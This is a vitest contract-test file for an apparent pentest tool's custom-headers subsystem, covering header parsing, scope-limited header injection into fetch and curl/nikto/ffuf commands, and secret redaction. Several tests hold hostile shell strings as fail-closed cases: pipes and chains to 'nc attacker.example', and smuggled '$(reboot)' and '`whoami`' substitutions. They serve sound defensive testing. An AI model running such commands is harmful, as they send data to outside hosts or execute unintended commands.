// Contract tests for the custom-headers subsystem: resolver layering/scope,
// `targetFetch`, shell injection, history redaction, parser errors.

import { mkdtempSync, rmSync } from "node:fs";
import { writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { redactSecretsInHistoryEntry } from "../history";
import {
  formatParseError,
  parseHeaderLine,
  parseHeadersFromFile,
} from "./parse";
import {
  applyHeadersToShellCommand,
  type ResolverSession,
  resolveEffectiveHeaders,
  targetFetch,
} from "./targetHeaders";
import { isSensitiveHeaderName, renderHeaderValue } from "./types";

function makeSession(
  overrides: Partial<ResolverSession> = {},
): ResolverSession {
  return {
    targets: ["https://example.com"],
    config: { headers: { "X-Test": "1" } },
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// parseHeaderLine — total parser contract
// ---------------------------------------------------------------------------

describe("parseHeaderLine", () => {
  it("accepts Name: Value", () => {
    const r = parseHeaderLine("X-API-Key: abc");
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.value.name).toBe("X-API-Key");
      expect(r.value.value).toBe("abc");
    }
  });

  it("strips a leading -H curl prefix and surrounding quotes", () => {
    const r = parseHeaderLine(`-H "Authorization: Bearer xyz"`);
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.value.name).toBe("Authorization");
      expect(r.value.value).toBe("Bearer xyz");
    }
  });

  it("rejects a missing colon", () => {
    const r = parseHeaderLine("X-API-Key abc");
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error.kind).toBe("missing-colon");
  });

  it("rejects whitespace in the name", () => {
    const r = parseHeaderLine("X API: abc");
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error.kind).toBe("name-has-whitespace");
  });

  it("rejects CRLF in the value (injection guard)", () => {
    const r = parseHeaderLine("X: a\r\nInjected: 1");
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error.kind).toBe("crlf-in-value");
  });

  it("never throws — totality", () => {
    const inputs = ["", ":", "a:", ":b", "no colon", "x\nx: y"];
    for (const i of inputs) {
      expect(() => parseHeaderLine(i)).not.toThrow();
    }
  });

  it("formatParseError never includes the raw value", () => {
    const r = parseHeaderLine("Authorization Bearer secret-token-abc-123");
    expect(r.ok).toBe(false);
    if (!r.ok) {
      const formatted = formatParseError(r.error);
      expect(formatted).not.toContain("secret-token-abc-123");
    }
  });
});

// ---------------------------------------------------------------------------
// parseHeadersFromFile — JSON and Name:Value branches
// ---------------------------------------------------------------------------

describe("parseHeadersFromFile", () => {
  let tmp: string;

  beforeEach(() => {
    tmp = mkdtempSync(join(tmpdir(), "headers-contract-"));
  });
  afterEach(() => {
    rmSync(tmp, { recursive: true, force: true });
  });

  it("parses JSON object", async () => {
    const file = join(tmp, "h.json");
    await writeFile(file, JSON.stringify({ "X-API-Key": "abc" }));
    const r = await parseHeadersFromFile(file);
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.value[0].name).toBe("X-API-Key");
  });

  it("parses Name: Value lines with # comments", async () => {
    const file = join(tmp, "h.txt");
    await writeFile(file, "# a comment\nX-API-Key: abc\nUser-Agent: test\n");
    const r = await parseHeadersFromFile(file);
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.value).toHaveLength(2);
  });

  it("returns file-read-failed for a missing file", async () => {
    const r = await parseHeadersFromFile(join(tmp, "does-not-exist"));
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error[0].kind).toBe("file-read-failed");
  });

  it("rejects JSON with non-string values", async () => {
    const file = join(tmp, "bad.json");
    await writeFile(file, `{"X-API-Key": 42}`);
    const r = await parseHeadersFromFile(file);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error[0].kind).toBe("invalid-json");
  });
});

// ---------------------------------------------------------------------------
// resolveEffectiveHeaders — layering + scope
// ---------------------------------------------------------------------------

describe("resolveEffectiveHeaders", () => {
  it("returns empty for out-of-scope URLs (INV-scope-bound)", () => {
    const s = makeSession({
      targets: ["https://example.com"],
      config: { headers: { Authorization: "Bearer x" } },
    });
    const r = resolveEffectiveHeaders(s, "https://evil.com/path");
    expect(r).toEqual({});
  });

  it("merges session + credential + request layers", () => {
    const s = makeSession({
      config: { headers: { "X-Session": "1", "X-Both": "from-session" } },
      credentialManager: {
        listCredentialsWithHeaders: () => [
          {
            tokens: { customHeaders: { "X-Cred": "1", "X-Both": "from-cred" } },
          },
        ],
      },
    });
    const rec = resolveEffectiveHeaders(s, "https://example.com/api", {
      "X-Request": "1",
      "X-Both": "from-request",
    });
    expect(rec["X-Session"]).toBe("1");
    expect(rec["X-Cred"]).toBe("1");
    expect(rec["X-Request"]).toBe("1");
    // request > credential > session
    expect(rec["X-Both"]).toBe("from-request");
  });

  it("preserves first-seen casing on case-insensitive collision", () => {
    const s = makeSession({
      config: { headers: { "X-Foo": "lower" } },
    });
    const rec = resolveEffectiveHeaders(s, "https://example.com/api", {
      "x-foo": "upper",
    });
    expect(rec["X-Foo"]).toBe("upper");
    expect(rec["x-foo"]).toBeUndefined();
  });

  it("respects scopeConstraints.allowedHosts when no target is set", () => {
    const s = makeSession({
      targets: [],
      config: {
        headers: { "X-Test": "1" },
        scopeConstraints: { allowedHosts: ["api.internal"] },
      },
    });
    expect(resolveEffectiveHeaders(s, "https://api.internal/x")).toEqual({
      "X-Test": "1",
    });
    expect(resolveEffectiveHeaders(s, "https://example.com/x")).toEqual({});
  });
});

// ---------------------------------------------------------------------------
// targetFetch — proves headers actually hit the network call
// ---------------------------------------------------------------------------

describe("targetFetch", () => {
  it("merges resolved headers into the fetch call", async () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    const spy = vi
      .spyOn(globalThis, "fetch")
      .mockResolvedValue(new Response("ok"));

    await targetFetch(session, "https://example.com/x");

    expect(spy).toHaveBeenCalledTimes(1);
    const init = spy.mock.calls[0][1] as RequestInit;
    expect(init.headers).toMatchObject({ "X-API-Key": "abc" });

    spy.mockRestore();
  });

  it("does not leak session headers to out-of-scope hosts", async () => {
    const session = makeSession({
      config: { headers: { Authorization: "Bearer secret" } },
    });
    const spy = vi
      .spyOn(globalThis, "fetch")
      .mockResolvedValue(new Response("ok"));

    await targetFetch(session, "https://attacker.example.net/leak");

    const init = spy.mock.calls[0][1] as RequestInit;
    expect(init.headers).toEqual({});

    spy.mockRestore();
  });

  it("preserves caller overrides on out-of-scope URLs", async () => {
    // Caller-explicit overrides bypass scope (resolver only gates injected layers).
    const session = makeSession({
      config: { headers: { Authorization: "Bearer secret" } },
    });
    const spy = vi
      .spyOn(globalThis, "fetch")
      .mockResolvedValue(new Response("ok"));

    await targetFetch(session, "https://cve.example.org/writeup", {
      headers: { Accept: "text/html", "Accept-Language": "en-US" },
    });

    const init = spy.mock.calls[0][1] as RequestInit;
    expect(init.headers).toEqual({
      Accept: "text/html",
      "Accept-Language": "en-US",
    });

    spy.mockRestore();
  });
});

// ---------------------------------------------------------------------------
// applyHeadersToShellCommand — injection + fail-closed
// ---------------------------------------------------------------------------

describe("applyHeadersToShellCommand", () => {
  it("injects -H flags into curl commands", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    const r = applyHeadersToShellCommand(
      "curl https://example.com/api",
      session,
      ["example.com"],
    );
    expect(r.status).toBe("injected");
    expect(r.tool).toBe("curl");
    expect(r.command).toContain(`-H "X-API-Key: abc"`);
  });

  it("returns unknown-tool when the binary is not in the registry", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    const r = applyHeadersToShellCommand(
      "my-custom-tool --target https://example.com",
      session,
      ["example.com"],
    );
    expect(r.status).toBe("unknown-tool");
  });

  it("returns no-headers for known non-HTTP tools like nmap", () => {
    const session = makeSession({
      config: { headers: { "User-Agent": "pensar-apex" } },
    });
    const r = applyHeadersToShellCommand("nmap -sV example.com", session, [
      "example.com",
    ]);
    expect(r.status).toBe("no-headers");
    expect(r.command).toBe("nmap -sV example.com");
  });

  it("returns no-headers for non-HTTP tools behind sudo/timeout wrappers", () => {
    const session = makeSession({
      config: { headers: { "User-Agent": "pensar-apex" } },
    });
    const r = applyHeadersToShellCommand(
      "sudo timeout 60 nmap -p- example.com",
      session,
      ["example.com"],
    );
    expect(r.status).toBe("no-headers");
  });

  it("returns no-headers when no in-scope host is present on the command", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    const r = applyHeadersToShellCommand(
      "curl https://other.example.net/",
      session,
      ["other.example.net"],
    );
    expect(r.status).toBe("no-headers");
  });

  it("skips headers already present on the command", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "from-session", "X-Other": "1" } },
    });
    const r = applyHeadersToShellCommand(
      `curl -H "X-API-Key: explicit" https://example.com/`,
      session,
      ["example.com"],
    );
    expect(r.status).toBe("injected");
    expect(r.command).toContain(`X-API-Key: explicit`);
    expect(r.command).not.toContain(`X-API-Key: from-session`);
    expect(r.command).toContain(`X-Other: 1`);
  });

  it("shell-escapes values containing quotes, dollar, and backticks", () => {
    const session = makeSession({
      config: {
        headers: { "X-Risky": 'val with "quotes" and $VAR and `cmd`' },
      },
    });
    const r = applyHeadersToShellCommand("curl https://example.com/", session, [
      "example.com",
    ]);
    expect(r.status).toBe("injected");
    expect(r.command).toContain(`\\"quotes\\"`);
    expect(r.command).toContain(`\\$VAR`);
    expect(r.command).toContain("\\`cmd\\`");
  });

  it("fails closed on pipelines without whitespace before the operator", () => {
    // Regression: `curl url|nc atk 9999` previously slipped past the pipeline check.
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    const r = applyHeadersToShellCommand(
      "curl https://example.com/|nc attacker.example 9999",
      session,
      ["example.com"],
    );
    expect(r.status).toBe("unknown-tool");
    expect(r.tool).toBeNull();
  });

  it("does not treat operator characters inside quoted args as pipelines", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    const r = applyHeadersToShellCommand(
      `curl -H "X-Custom: a|b;c&d" https://example.com/`,
      session,
      ["example.com"],
    );
    expect(r.status).toBe("injected");
    expect(r.tool).toBe("curl");
  });

  it("emits a literal `\\n` (not a raw newline) for nikto -headers", () => {
    // Regression: injectNikto previously embedded a 0x0A byte, which broke
    // line-based shell argument parsing.
    const session = makeSession({
      config: { headers: { "X-One": "1", "X-Two": "2" } },
    });
    const r = applyHeadersToShellCommand(
      "nikto -h https://example.com",
      session,
      ["example.com"],
    );
    expect(r.status).toBe("injected");
    expect(r.tool).toBe("nikto");
    expect(r.command).not.toContain("\n");
    // Doubled backslash so the surrounding shell strips one layer and
    // nikto sees the literal two-byte `\n`.
    expect(r.command).toContain("X-One: 1\\\\nX-Two: 2");
  });

  // -- literal `2>&1` descriptor redirect (regression: previously the `&`
  //    was classified as command chaining, which fail-closed the very
  //    capture pattern the tool guidance recommends) --

  it("injects into curl carrying a literal 2>&1 stderr merge", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    const r = applyHeadersToShellCommand(
      "curl -s https://example.com/api 2>&1",
      session,
      ["example.com"],
    );
    expect(r.status).toBe("injected");
    expect(r.tool).toBe("curl");
    expect(r.command).toContain(`-H "X-API-Key: abc"`);
    // The merge token must survive byte-for-byte.
    expect(r.command.endsWith("2>&1")).toBe(true);
  });

  it("injects when 2>&1 follows a file redirect (tool-guided capture pattern)", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    const r = applyHeadersToShellCommand(
      "curl -s https://example.com/ > scratchpad/scan.txt 2>&1",
      session,
      ["example.com"],
    );
    expect(r.status).toBe("injected");
    expect(r.command).toContain("> scratchpad/scan.txt 2>&1");
  });

  it("injects for other registered tools carrying 2>&1", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    const r = applyHeadersToShellCommand(
      "ffuf -u https://example.com/FUZZ -w words.txt 2>&1",
      session,
      ["example.com"],
    );
    expect(r.status).toBe("injected");
    expect(r.tool).toBe("ffuf");
  });

  it("injects when 2>&1 appears before the URL", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    const r = applyHeadersToShellCommand(
      "curl 2>&1 -s https://example.com/api",
      session,
      ["example.com"],
    );
    expect(r.status).toBe("injected");
    expect(r.tool).toBe("curl");
  });

  it("still treats quoted operator args as injectable alongside 2>&1", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    for (const cmd of [
      `curl -H "X-Custom: a|b;c&d" https://example.com/ 2>&1`,
      // Single quotes make substitution text literal, not live.
      `curl 'a$(literal)' https://example.com/ 2>&1`,
    ]) {
      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
      expect(r.status).toBe("injected");
      expect(r.tool).toBe("curl");
    }
  });

  it("fails closed when real chaining follows 2>&1", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    for (const cmd of [
      "curl -s https://example.com/api 2>&1; whoami",
      "curl -s https://example.com/api 2>&1 && nc attacker.example 4444",
      "curl -s https://example.com/api 2>&1 & curl https://attacker.example/x",
    ]) {
      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
      expect(r.status).toBe("unknown-tool");
      expect(r.tool).toBeNull();
    }
  });

  it("fails closed on pipelines that contain 2>&1", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    const r = applyHeadersToShellCommand(
      "curl -s https://example.com/api 2>&1 | tee scratchpad/out.txt",
      session,
      ["example.com"],
    );
    expect(r.status).toBe("unknown-tool");
  });

  it("fails closed on redirect targets that are not the literal token", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    for (const cmd of [
      "curl -s https://example.com/api 2>&$fd",
      "curl -s https://example.com/api 2>&$(cat scratchpad/fd)",
      // `1$(…)` extends the target word — POSIX shells expand it, running
      // the substitution.
      "curl -s https://example.com/api 2>&1$(reboot)",
      "curl -s https://example.com/api 2>&12",
      "curl -s https://example.com/api 2>&1x",
    ]) {
      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
      expect(r.status).toBe("unknown-tool");
      expect(r.command).toBe(cmd);
    }
  });

  it("fails closed when digits or words are glued onto the 2 of 2>&1", () => {
    // `32>&1` is an fd-32 dup and `api2>&1` a bare `>&1` on the word
    // `api2` — neither is the literal merge token, which must stand alone.
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    for (const cmd of [
      "curl -s https://example.com/api 32>&1",
      "curl -s https://example.com/api2>&1",
    ]) {
      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
      expect(r.status).toBe("unknown-tool");
      expect(r.command).toBe(cmd);
    }
  });

  it("fails closed when 2>&1 rides a command with multiple hosts, mixed or not", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    for (const hosts of [
      ["example.com", "attacker.net"],
      ["a.example.com", "b.example.com"],
    ] as const) {
      const r = applyHeadersToShellCommand(
        `curl https://${hosts[0]}/a https://${hosts[1]}/b 2>&1`,
        session,
        [...hosts],
      );
      expect(r.status).toBe("unknown-tool");
    }
  });

  it("keeps pre-existing behavior for multi-host commands without 2>&1", () => {
    // Scope enforcement for the whole command lives in the caller's scope
    // guard; this layer only fail-closes the new `2>&1` acceptance.
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    const r = applyHeadersToShellCommand(
      "curl https://example.com/a https://attacker.net/b",
      session,
      ["example.com", "attacker.net"],
    );
    expect(r.status).toBe("injected");
  });

  it("fails closed when 2>&1 shares the command with live substitution", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    for (const cmd of [
      // Command substitution inside double quotes still executes.
      `curl "$(printf 'https://example.com')" 2>&1`,
      "curl -s https://example.com/api `whoami` 2>&1",
      "curl -s https://example.com/api <(whoami) 2>&1",
      "curl -s https://example.com/api 2>&1 $(whoami)",
    ]) {
      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
      expect(r.status).toBe("unknown-tool");
      expect(r.tool).toBeNull();
    }
  });

  it("fails closed when 2>&1 rides live parameter expansion", () => {
    // A `$SECOND_URL` arg expands at runtime to a host no scope check has
    // verified — extracted hosts still contain only the literal one.
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    for (const cmd of [
      `curl https://example.com/ "$SECOND_URL" 2>&1`,
      `curl https://example.com/ \${SECOND_URL} 2>&1`,
      "curl https://example.com/ $SECOND_URL 2>&1",
    ]) {
      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
      expect(r.status).toBe("unknown-tool");
      expect(r.tool).toBeNull();
    }
  });

  it("fails closed when 2>&1 rides ANSI-C or translated quoting", () => {
    // `$'…'` decodes escapes at runtime, so an encoded second URL never
    // appears as a literal host for scope checks; `$"…"` translates via
    // the locale. Both are live shell extensions on the redirect path.
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    for (const cmd of [
      "curl https://example.com/ $'https://attacker.net/x' 2>&1",
      "curl https://example.com/ $'https://att\\x61cker.net/x' 2>&1",
      'curl https://example.com/ $"https://attacker.net/x" 2>&1',
    ]) {
      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
      expect(r.status).toBe("unknown-tool");
      expect(r.tool).toBeNull();
    }
  });

  it("accepts 2>&1 with quoted or escaped dollar literals", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    for (const cmd of [
      `curl -H 'Cookie: a$literal' https://example.com/ 2>&1`,
      'curl -H "X-Note: \\$literal" https://example.com/ 2>&1',
      // A `$` before a closing quote inside "…" is a literal dollar, not
      // an ANSI-C/translated opener (those are unquoted).
      'curl -H "X-Note: ends with $" https://example.com/ 2>&1',
    ]) {
      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
      expect(r.status).toBe("injected");
    }
  });

  it("fails closed when a second command follows 2>&1 on a new line", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    const r = applyHeadersToShellCommand(
      "curl -s https://example.com/api 2>&1\nwhoami",
      session,
      ["example.com"],
    );
    expect(r.status).toBe("unknown-tool");
  });

  it("fails closed on quote concatenation onto the 2>&1 target", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    for (const cmd of [
      `curl -s https://example.com/api 2>&1"$(whoami)"`,
      "curl -s https://example.com/api 2>&1'x'",
    ]) {
      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
      expect(r.status).toBe("unknown-tool");
    }
  });

  it("injects for multiple URLs on one in-scope host", () => {
    const session = makeSession({
      config: { headers: { "X-API-Key": "abc" } },
    });
    const r = applyHeadersToShellCommand(
      "curl https://example.com/a https://example.com/b 2>&1",
      session,
      ["example.com"],
    );
    expect(r.status).toBe("injected");
  });
});

// ---------------------------------------------------------------------------
// Redaction of header-bearing history entries
// ---------------------------------------------------------------------------

describe("redactSecretsInHistoryEntry", () => {
  it("masks the value of /headers add", () => {
    const r = redactSecretsInHistoryEntry(
      "/headers add Authorization: Bearer super-secret",
    );
    expect(r).toBe("/headers add Authorization: <redacted>");
  });

  it("masks the value of /headers set", () => {
    const r = redactSecretsInHistoryEntry("/headers set X-API-Key: abc123");
    expect(r).toBe("/headers set X-API-Key: <redacted>");
  });

  it("masks --header CLI flag payload", () => {
    const r = redactSecretsInHistoryEntry(
      `pensar pentest --target https://example.com --header "Authorization: Bearer xyz"`,
    );
    expect(r).not.toContain("xyz");
    expect(r).toContain("Authorization: <redacted>");
  });

  it("masks multi-word quoted --header values (Bearer <token>)", () => {
    // Regression: prior regex stopped at the first whitespace in the value.
    const r = redactSecretsInHistoryEntry(
      `pensar pentest --header "Authorization: Bearer super-secret-token"`,
    );
    expect(r).not.toContain("super-secret-token");
    expect(r).toContain(`"Authorization: <redacted>"`);
  });

  it("leaves unrelated commands untouched", () => {
    const input = "/skills list";
    expect(redactSecretsInHistoryEntry(input)).toBe(input);
  });
});

// ---------------------------------------------------------------------------
// Display sensitivity — masking by default
// ---------------------------------------------------------------------------

describe("renderHeaderValue", () => {
  it("masks sensitive headers when showSecrets is false", () => {
    const v = renderHeaderValue("Authorization", "Bearer secret", false);
    expect(v).not.toContain("secret");
  });

  it("reveals sensitive headers when showSecrets is true", () => {
    const v = renderHeaderValue("Authorization", "Bearer secret", true);
    expect(v).toContain("secret");
  });

  it("does not mask non-sensitive headers", () => {
    const v = renderHeaderValue("X-Request-Id", "abc-123", false);
    expect(v).toBe("abc-123");
  });

  it("isSensitiveHeaderName covers the common cases", () => {
    expect(isSensitiveHeaderName("Authorization")).toBe(true);
    expect(isSensitiveHeaderName("Cookie")).toBe(true);
    expect(isSensitiveHeaderName("X-API-Key")).toBe(true);
    expect(isSensitiveHeaderName("Set-Cookie")).toBe(true);
    expect(isSensitiveHeaderName("User-Agent")).toBe(false);
  });
});
